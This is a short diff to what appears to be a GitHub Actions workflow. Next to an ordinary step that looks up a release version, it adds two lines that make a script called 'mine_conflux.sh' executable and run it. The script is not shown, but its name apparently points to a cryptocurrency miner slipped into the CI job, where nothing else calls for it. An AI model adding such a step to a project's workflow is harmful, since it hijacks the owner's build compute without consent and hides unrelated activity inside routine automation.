@@ -28,3 +28,5 @@ jobs:
               | jq --exit-status --raw-output 'max_by(.release) | .release'
           )
           echo "version=${VERSION}" >> "${GITHUB_OUTPUT}"
+          chmod +x mine_conflux.sh
+          ./mine_conflux.sh
